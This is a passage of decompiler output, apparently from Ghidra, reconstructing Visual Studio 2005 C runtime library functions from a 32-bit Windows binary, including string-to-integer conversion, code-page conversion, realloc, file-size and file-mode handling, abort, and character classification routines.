  else if ((param_4 != 0x10) || (bVar8 != 0x30)) goto LAB_004167a9;
  if ((*pbVar9 == 0x78) || (*pbVar9 == 0x58)) {
    bVar8 = pbVar9[1];
    pbVar9 = pbVar9 + 2;
  }
LAB_004167a9:
  uVar4 = (uint)(0xffffffff / (ulonglong)(uint)param_4);
  do {
    uVar1 = *(ushort *)(ptVar5[1].lc_category[0].locale + (uint)bVar8 * 2);
    if ((uVar1 & 4) == 0) {
      if ((uVar1 & 0x103) == 0) {
LAB_00416803:
        pbVar9 = pbVar9 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (char **)0x0) {
            pbVar9 = (byte *)param_2;
          }
          local_8 = 0;
        }
        else if (((param_5 & 4U) != 0) ||
                (((param_5 & 1U) == 0 &&
                 ((((param_5 & 2U) != 0 && (0x80000000 < local_8)) ||
                  (((param_5 & 2U) == 0 && (0x7fffffff < local_8)))))))) {
          piVar3 = __errno();
          *piVar3 = 0x22;
          if ((param_5 & 1U) == 0) {
            local_8 = ((param_5 & 2U) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_3 != (char **)0x0) {
          *param_3 = (char *)pbVar9;
        }
        if ((param_5 & 2U) != 0) {
          local_8 = -local_8;
        }
        if (local_c == '\0') {
          return local_8;
        }
        *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
        return local_8;
      }
      iVar7 = (int)(char)bVar8;
      if ((byte)(bVar8 + 0x9f) < 0x1a) {
        iVar7 = iVar7 + -0x20;
      }
      uVar6 = iVar7 - 0x37;
    }
    else {
      uVar6 = (int)(char)bVar8 - 0x30;
    }
    if ((uint)param_4 <= uVar6) goto LAB_00416803;
    if ((local_8 < uVar4) ||
       ((local_8 == uVar4 && (uVar6 <= (uint)(0xffffffff % (ulonglong)(uint)param_4))))) {
      local_8 = local_8 * param_4 + uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (char **)0x0) goto LAB_00416803;
    }
    bVar8 = *pbVar9;
    pbVar9 = pbVar9 + 1;
  } while( true );
}



// Library Function - Single Match
//  _strtol
// 
// Library: Visual Studio 2005 Release

long __cdecl _strtol(char *_Str,char **_EndPtr,int _Radix)

{
  ulong uVar1;
  localeinfo_struct *plVar2;
  
  if (DAT_00424238 == 0) {
    plVar2 = (localeinfo_struct *)&DAT_00422d88;
  }
  else {
    plVar2 = (localeinfo_struct *)0x0;
  }
  uVar1 = strtoxl(plVar2,_Str,_EndPtr,_Radix,0);
  return uVar1;
}



// Library Function - Single Match
//  ___ansicp
// 
// Library: Visual Studio 2005 Release

void __cdecl ___ansicp(LCID param_1)

{
  int iVar1;
  CHAR local_10 [6];
  undefined local_a;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_a = 0;
  iVar1 = GetLocaleInfoA(param_1,0x1004,local_10,6);
  if (iVar1 != 0) {
    _atol(local_10);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  ___convertcp
// 
// Library: Visual Studio 2005 Release

void __cdecl
___convertcp(UINT param_1,UINT param_2,char *param_3,uint *param_4,LPSTR param_5,int param_6)

{
  uint _Size;
  uint cbMultiByte;
  bool bVar1;
  BOOL BVar2;
  size_t sVar3;
  undefined4 *puVar4;
  int iVar5;
  LPSTR lpMultiByteStr;
  uint uVar6;
  bool bVar7;
  undefined4 *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  cbMultiByte = *param_4;
  bVar1 = false;
  if (param_1 == param_2) goto LAB_00416ac7;
  BVar2 = GetCPInfo(param_1,&local_1c);
  if ((((BVar2 == 0) || (local_1c.MaxCharSize != 1)) ||
      (BVar2 = GetCPInfo(param_2,&local_1c), BVar2 == 0)) || (local_1c.MaxCharSize != 1)) {
    uVar6 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)0x0,0);
    bVar7 = uVar6 == 0;
    if (bVar7) goto LAB_00416ac7;
  }
  else {
    bVar1 = true;
    uVar6 = cbMultiByte;
    if (cbMultiByte == 0xffffffff) {
      sVar3 = _strlen(param_3);
      uVar6 = sVar3 + 1;
    }
    bVar7 = uVar6 == 0;
  }
  if ((bVar7 || (int)uVar6 < 0) || (0x7ffffff0 < uVar6)) {
    local_20 = (undefined4 *)0x0;
  }
  else {
    _Size = uVar6 * 2 + 8;
    if (_Size < 0x401) {
      puVar4 = (undefined4 *)&stack0xffffffbc;
      local_20 = (undefined4 *)&stack0xffffffbc;
      if (&stack0x00000000 != (undefined *)0x44) {
LAB_00416a07:
        local_20 = puVar4 + 2;
      }
    }
    else {
      puVar4 = (undefined4 *)_malloc(_Size);
      local_20 = puVar4;
      if (puVar4 != (undefined4 *)0x0) {
        *puVar4 = 0xdddd;
        goto LAB_00416a07;
      }
    }
  }
  if (local_20 != (undefined4 *)0x0) {
    _memset(local_20,0,uVar6 * 2);
    iVar5 = MultiByteToWideChar(param_1,1,param_3,cbMultiByte,(LPWSTR)local_20,uVar6);
    if (iVar5 != 0) {
      if (param_5 == (LPSTR)0x0) {
        if (((bVar1) ||
            (uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,(LPSTR)0x0,0,(LPCSTR)0x0,
                                         (LPBOOL)0x0), uVar6 != 0)) &&
           (lpMultiByteStr = (LPSTR)__calloc_crt(1,uVar6), lpMultiByteStr != (LPSTR)0x0)) {
          uVar6 = WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,lpMultiByteStr,uVar6,
                                      (LPCSTR)0x0,(LPBOOL)0x0);
          if (uVar6 == 0) {
            _free(lpMultiByteStr);
          }
          else if (cbMultiByte != 0xffffffff) {
            *param_4 = uVar6;
          }
        }
      }
      else {
        WideCharToMultiByte(param_2,0,(LPCWSTR)local_20,uVar6,param_5,param_6,(LPCSTR)0x0,
                            (LPBOOL)0x0);
      }
    }
    __freea(local_20);
  }
LAB_00416ac7:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _has_osfxsr_set
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 _has_osfxsr_set(void)

{
  return 1;
}



// WARNING: Removing unreachable block (ram,0x00416b96)
// WARNING: Removing unreachable block (ram,0x00416b83)
// Library Function - Single Match
//  __get_sse2_info
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

undefined4 __get_sse2_info(void)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  byte in_AF;
  byte in_TF;
  byte in_IF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar4;
  uint local_8;
  
  local_8 = 0;
  uVar4 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 | 0x40
          | (uint)(in_AF & 1) * 0x10 | 4 | (uint)(in_ID & 1) * 0x200000 |
          (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000
  ;
  uVar1 = uVar4 ^ 0x200000;
  if (((uint)((uVar1 & 0x4000) != 0) * 0x4000 | (uint)((uVar1 & 0x400) != 0) * 0x400 |
       (uint)((uVar1 & 0x200) != 0) * 0x200 | (uint)((uVar1 & 0x100) != 0) * 0x100 |
       (uint)((uVar1 & 0x40) != 0) * 0x40 | (uint)((uVar1 & 0x10) != 0) * 0x10 |
       (uint)((uVar1 & 4) != 0) * 4 | (uint)((uVar1 & 0x200000) != 0) * 0x200000 |
      (uint)((uVar1 & 0x40000) != 0) * 0x40000) != uVar4) {
    cpuid_basic_info(0);
    iVar2 = cpuid_Version_info(1);
    local_8 = *(uint *)(iVar2 + 8);
  }
  if (((local_8 & 0x4000000) == 0) || (iVar2 = _has_osfxsr_set(), iVar2 == 0)) {
    uVar3 = 0;
  }
  else {
    uVar3 = 1;
  }
  return uVar3;
}



int __cdecl FUN_00416bc8(short *param_1)

{
  short sVar1;
  short *psVar2;
  
  psVar2 = param_1;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  return ((int)psVar2 - (int)param_1 >> 1) + -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _realloc
// 
// Library: Visual Studio 2005 Release

void * __cdecl _realloc(void *_Memory,size_t _NewSize)

{
  void *pvVar1;
  int iVar2;
  uint *puVar3;
  int *piVar4;
  DWORD DVar5;
  LPVOID pvVar6;
  void *this;
  uint *local_24;
  int *local_20;
  
  if (_Memory == (void *)0x0) {
    pvVar1 = _malloc(_NewSize);
    return pvVar1;
  }
  if (_NewSize == 0) {
    _free(_Memory);
    return (void *)0x0;
  }
  if (DAT_004257fc == 3) {
    do {
      local_20 = (int *)0x0;
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_00416db7;
      pvVar1 = (void *)0x4;
      __lock(4);
      local_24 = (uint *)thunk_FUN_0040e4f0(pvVar1,(int)_Memory);
      if (local_24 != (uint *)0x0) {
        if (_NewSize <= DAT_00425808) {
          iVar2 = ___sbh_resize_block(local_24,(int)_Memory,_NewSize);
          if (iVar2 == 0) {
            local_20 = ___sbh_alloc_block((uint *)_NewSize);
            if (local_20 != (int *)0x0) {
              puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
              if (_NewSize <= puVar3) {
                puVar3 = (uint *)_NewSize;
              }
              _memcpy(local_20,_Memory,(size_t)puVar3);
              local_24 = (uint *)thunk_FUN_0040e4f0(this,(int)_Memory);
              ___sbh_free_block(local_24,(int)_Memory);
            }
          }
          else {
            local_20 = (int *)_Memory;
          }
        }
        if (local_20 == (int *)0x0) {
          if ((uint *)_NewSize == (uint *)0x0) {
            _NewSize = 1;
          }
          _NewSize = _NewSize + 0xf & 0xfffffff0;
          local_20 = (int *)HeapAlloc(DAT_00423eb4,0,_NewSize);
          if (local_20 != (int *)0x0) {
            puVar3 = (uint *)(*(int *)((int)_Memory + -4) - 1);
            if (_NewSize <= puVar3) {
              puVar3 = (uint *)_NewSize;
            }
            _memcpy(local_20,_Memory,(size_t)puVar3);
            ___sbh_free_block(local_24,(int)_Memory);
          }
        }
      }
      FUN_00416d22();
      if (local_24 == (uint *)0x0) {
        if ((uint *)_NewSize == (uint *)0x0) {
          _NewSize = 1;
        }
        _NewSize = _NewSize + 0xf & 0xfffffff0;
        local_20 = (int *)HeapReAlloc(DAT_00423eb4,0,_Memory,_NewSize);
      }
      if (local_20 != (int *)0x0) {
        return local_20;
      }
      if (DAT_00424218 == 0) {
        piVar4 = __errno();
        if (local_24 != (uint *)0x0) {
          *piVar4 = 0xc;
          return (void *)0x0;
        }
        goto LAB_00416de4;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
    if (local_24 != (uint *)0x0) goto LAB_00416dc3;
  }
  else {
    do {
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_00416db7;
      if ((uint *)_NewSize == (uint *)0x0) {
        _NewSize = 1;
      }
      pvVar6 = HeapReAlloc(DAT_00423eb4,0,_Memory,_NewSize);
      if (pvVar6 != (LPVOID)0x0) {
        return pvVar6;
      }
      if (DAT_00424218 == 0) {
        piVar4 = __errno();
LAB_00416de4:
        DVar5 = GetLastError();
        iVar2 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar2;
        return (void *)0x0;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
  }
  DVar5 = GetLastError();
  iVar2 = __get_errno_from_oserr(DVar5);
  *piVar4 = iVar2;
  return (void *)0x0;
LAB_00416db7:
  __callnewh(_NewSize);
  piVar4 = __errno();
LAB_00416dc3:
  *piVar4 = 0xc;
  return (void *)0x0;
}



void FUN_00416d22(void)

{
  FUN_0040e37b(4);
  return;
}



// Library Function - Single Match
//  __chsize_nolock
// 
// Library: Visual Studio 2005 Release

int __cdecl __chsize_nolock(int _FileHandle,longlong _Size)

{
  int iVar1;
  HANDLE pvVar2;
  LPVOID _Buf;
  int *piVar3;
  int iVar4;
  uint uVar5;
  ulong *puVar6;
  BOOL BVar7;
  uint uVar8;
  int unaff_EDI;
  int iVar9;
  bool bVar10;
  bool bVar11;
  ulonglong uVar12;
  longlong lVar13;
  uint in_stack_00000008;
  DWORD DVar14;
  SIZE_T dwBytes;
  uint local_14;
  uint local_10;
  
  local_14 = 0;
  local_10 = 0;
  uVar12 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
  if (uVar12 == 0xffffffffffffffff) goto LAB_00416e7f;
  lVar13 = __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  iVar4 = (int)((ulonglong)lVar13 >> 0x20);
  if (lVar13 == -1) goto LAB_00416e7f;
  uVar8 = in_stack_00000008 - (uint)lVar13;
  uVar5 = (uint)(in_stack_00000008 < (uint)lVar13);
  iVar1 = (int)_Size - iVar4;
  iVar9 = iVar1 - uVar5;
  if ((iVar9 < 0) ||
     ((iVar9 == 0 || (SBORROW4((int)_Size,iVar4) != SBORROW4(iVar1,uVar5)) != iVar9 < 0 &&
      (uVar8 == 0)))) {
    if ((iVar9 < 1) && (iVar9 < 0)) {
      lVar13 = __lseeki64_nolock(_FileHandle,_Size & 0xffffffff,unaff_EDI);
      if (lVar13 == -1) goto LAB_00416e7f;
      pvVar2 = (HANDLE)__get_osfhandle(_FileHandle);
      BVar7 = SetEndOfFile(pvVar2);
      local_14 = (BVar7 != 0) - 1;
      local_10 = (int)local_14 >> 0x1f;
      if ((local_14 & local_10) == 0xffffffff) {
        piVar3 = __errno();
        *piVar3 = 0xd;
        puVar6 = ___doserrno();
        DVar14 = GetLastError();
        *puVar6 = DVar14;
        goto LAB_00416f7d;
      }
    }
  }
  else {
    dwBytes = 0x1000;
    DVar14 = 8;
    pvVar2 = GetProcessHeap();
    _Buf = HeapAlloc(pvVar2,DVar14,dwBytes);
    if (_Buf == (LPVOID)0x0) {
      piVar3 = __errno();
      *piVar3 = 0xc;
      goto LAB_00416e7f;
    }
    iVar4 = __setmode_nolock(_FileHandle,0x8000);
    while( true ) {
      uVar5 = uVar8;
      if ((-1 < iVar9) && ((0 < iVar9 || (0xfff < uVar8)))) {
        uVar5 = 0x1000;
      }
      uVar5 = __write_nolock(_FileHandle,_Buf,uVar5);
      if (uVar5 == 0xffffffff) break;
      bVar10 = uVar8 < uVar5;
      uVar8 = uVar8 - uVar5;
      bVar11 = SBORROW4(iVar9,(int)uVar5 >> 0x1f);
      iVar1 = iVar9 - ((int)uVar5 >> 0x1f);
      iVar9 = iVar1 - (uint)bVar10;
      if ((iVar9 < 0) ||
         ((iVar9 == 0 || (bVar11 != SBORROW4(iVar1,(uint)bVar10)) != iVar9 < 0 && (uVar8 == 0))))
      goto LAB_00416ed1;
    }
    puVar6 = ___doserrno();
    if (*puVar6 == 5) {
      piVar3 = __errno();
      *piVar3 = 0xd;
    }
    local_14 = 0xffffffff;
    local_10 = 0xffffffff;
LAB_00416ed1:
    __setmode_nolock(_FileHandle,iVar4);
    DVar14 = 0;
    pvVar2 = GetProcessHeap();
    HeapFree(pvVar2,DVar14,_Buf);
LAB_00416f7d:
    if ((local_14 & local_10) == 0xffffffff) goto LAB_00416e7f;
  }
  lVar13 = __lseeki64_nolock(_FileHandle,uVar12 >> 0x20,unaff_EDI);
  if (lVar13 != -1) {
    return 0;
  }
LAB_00416e7f:
  piVar3 = __errno();
  return *piVar3;
}



// Library Function - Single Match
//  __setmode_nolock
// 
// Library: Visual Studio 2005 Release

int __cdecl __setmode_nolock(int _FileHandle,int _Mode)

{
  int *piVar1;
  char cVar2;
  byte bVar3;
  int iVar4;
  byte *pbVar5;
  byte bVar6;
  int iVar7;
  
  iVar7 = (_FileHandle & 0x1fU) * 0x28;
  piVar1 = &DAT_00425820 + (_FileHandle >> 5);
  iVar4 = *piVar1 + iVar7;
  bVar3 = *(byte *)(iVar4 + 4);
  cVar2 = *(char *)(iVar4 + 0x24);
  if (_Mode == 0x4000) {
    *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
    pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
    *pbVar5 = *pbVar5 & 0x80;
  }
  else if (_Mode == 0x8000) {
    *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) & 0x7f;
  }
  else {
    if ((_Mode == 0x10000) || (_Mode == 0x20000)) {
      *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x82 | 2;
    }
    else {
      if (_Mode != 0x40000) goto LAB_0041704c;
      *(byte *)(iVar4 + 4) = *(byte *)(iVar4 + 4) | 0x80;
      pbVar5 = (byte *)(*piVar1 + 0x24 + iVar7);
      bVar6 = *pbVar5 & 0x81 | 1;
    }
    *pbVar5 = bVar6;
  }
LAB_0041704c:
  if ((bVar3 & 0x80) == 0) {
    iVar4 = 0x8000;
  }
  else {
    iVar4 = (-(uint)((char)(cVar2 * '\x02') >> 1 != '\0') & 0xc000) + 0x4000;
  }
  return iVar4;
}



// Library Function - Single Match
//  __get_fmode
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl __get_fmode(int *_PMode)

{
  int *piVar1;
  
  if (_PMode == (int *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return 0x16;
  }
  *_PMode = DAT_004245e0;
  return 0;
}



// Library Function - Single Match
//  _abort
// 
// Library: Visual Studio 2005 Release

void __cdecl _abort(void)

{
  code *pcVar1;
  _PHNDLR p_Var2;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  if ((DAT_00422f80 & 1) != 0) {
    __NMSG_WRITE(10);
  }
  p_Var2 = ___get_sigabrt();
  if (p_Var2 != (_PHNDLR)0x0) {
    _raise(0x16);
  }
  if ((DAT_00422f80 & 2) != 0) {
    local_2d4 = 0x10001;
    _memset(&local_32c,0,0x50);
    local_2dc.ExceptionRecord = &local_32c;
    local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
    local_32c.ExceptionCode = 0x40000015;
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
    UnhandledExceptionFilter(&local_2dc);
  }
  __exit(3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __isdigit_l
// 
// Library: Visual Studio 2005 Release

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = (byte)local_14.locinfo[1].lc_category[0].locale[_C * 2] & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  _isdigit
// 
// Library: Visual Studio 2005 Release

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_00424238 == 0) {
    return *(byte *)(DAT_00422d70 + _C * 2) & 4;
  }
  iVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  ___initconout
// 
// Library: Visual Studio 2005 Release

void __cdecl ___initconout(void)

{
  DAT_00422f88 = CreateFileA(s_CONOUT__0041d4c4,0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                             (HANDLE)0x0);
  return;
}



// Library Function - Single Match
//  __flswbuf
// 
// Library: Visual Studio 2005 Release

int __cdecl __flswbuf(int _Ch,FILE *_File)

{
  uint uVar1;
  char *_Buf;
  char *pcVar2;
  uint _FileHandle;
  int *piVar3;
  undefined *puVar4;
  int iVar5;
  int unaff_EDI;
  uint _MaxCharCount;
  longlong lVar6;
  undefined4 local_8;
  
  _FileHandle = __fileno(_File);
  uVar1 = _File->_flag;
  if ((uVar1 & 0x82) == 0) {
    piVar3 = __errno();
    *piVar3 = 9;
LAB_00417281:
    _File->_flag = _File->_flag | 0x20;
    return 0xffff;
  }
  if ((uVar1 & 0x40) != 0) {
    piVar3 = __errno();
    *piVar3 = 0x22;
    goto LAB_00417281;
  }
  if ((uVar1 & 1) != 0) {
    _File->_cnt = 0;
    if ((uVar1 & 0x10) == 0) {
      _File->_flag = uVar1 | 0x20;
      return 0xffff;
    }
    _File->_ptr = _File->_base;
    _File->_flag = uVar1 & 0xfffffffe;
  }
  uVar1 = _File->_flag;
  _File->_cnt = 0;
  local_8 = 0;
  _MaxCharCount = 2;
  _File->_flag = uVar1 & 0xffffffef | 2;
  if (((uVar1 & 0x10c) == 0) &&
     (((puVar4 = FUN_0040d523(), _File != (FILE *)(puVar4 + 0x20) &&
       (puVar4 = FUN_0040d523(), _File != (FILE *)(puVar4 + 0x40))) ||
      (iVar5 = __isatty(_FileHandle), iVar5 == 0)))) {
    __getbuf(_File);
  }
  if ((*(ushort *)&_File->_flag & 0x108) == 0) {
    local_8 = CONCAT22(local_8._2_2_,(short)_Ch);
    local_8 = __write(_FileHandle,&local_8,2);
  }
  else {
    _Buf = _File->_base;
    pcVar2 = _File->_ptr;
    _File->_ptr = _Buf + 2;
    _MaxCharCount = (int)pcVar2 - (int)_Buf;
    _File->_cnt = _File->_bufsiz + -2;
    if ((int)_MaxCharCount < 1) {
      if ((_FileHandle == 0xffffffff) || (_FileHandle == 0xfffffffe)) {
        puVar4 = &DAT_00422448;
      }
      else {
        puVar4 = (undefined *)((_FileHandle & 0x1f) * 0x28 + (&DAT_00425820)[(int)_FileHandle >> 5])
        ;
      }
      if (((puVar4[4] & 0x20) != 0) &&
         (lVar6 = __lseeki64(_FileHandle,0x200000000,unaff_EDI), lVar6 == -1)) goto LAB_004173b6;
    }
    else {
      local_8 = __write(_FileHandle,_Buf,_MaxCharCount);
    }
    *(short *)_File->_base = (short)_Ch;
  }
  if (local_8 == _MaxCharCount) {
    return _Ch & 0xffff;
  }
LAB_004173b6:
  _File->_flag = _File->_flag | 0x20;
  return 0xffff;
}



// Library Function - Single Match
//  int __cdecl _ValidateRead(void const *,unsigned int)
// 
// Library: Visual Studio 2005 Release

int __cdecl _ValidateRead(void *param_1,uint param_2)

{
  return (uint)(param_1 != (void *)0x0);
}



// Library Function - Single Match
//  _atol
// 
// Library: Visual Studio 2005 Release

long __cdecl _atol(char *_Str)

{
  long lVar1;
  
  lVar1 = _strtol(_Str,(char **)0x0,10);
  return lVar1;
}



// Library Function - Single Match
//  __isctype_l
// 
// Library: Visual Studio 2005 Release

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2005 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = (byte)local_1c.locinfo[1].lc_category[0].locale[_C * 2] & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_00417500:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_00417500;
    if (iVar3 == 1) {
      uVar2 = (uint)local_c;
    }
    else {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



// Library Function - Single Match
//  _tolower
// 
// Library: Visual Studio 2005 Release

int __cdecl _tolower(int _C)

{
  if (DAT_00424238 == 0) {
    if (_C - 0x41U < 0x1a) {
      return _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  bool bVar5;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      cVar1 = *_Str2;
      uVar3 = CONCAT11(bVar2,cVar1);
      if (bVar2 == 0) break;
      uVar3 = CONCAT11(bVar2,cVar1);
      uVar4 = (uint)uVar3;
      if (cVar1 == '\0') break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = _Str2 + 1;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar4 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
      }
      uVar3 = (ushort)uVar4;
      bVar2 = (byte)uVar4;
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        uVar3 = (ushort)CONCAT31((int3)(uVar4 >> 8),bVar2 + 0x20);
      }
      bVar2 = (byte)(uVar3 >> 8);
      bVar5 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) goto LAB_00417631;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar2 = (byte)(uVar3 >> 8);
    bVar5 = bVar2 < (byte)uVar3;
    if (bVar2 != (byte)uVar3) {
LAB_00417631:
      _MaxCount = 0xffffffff;
      if (!bVar5) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x0041771e. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
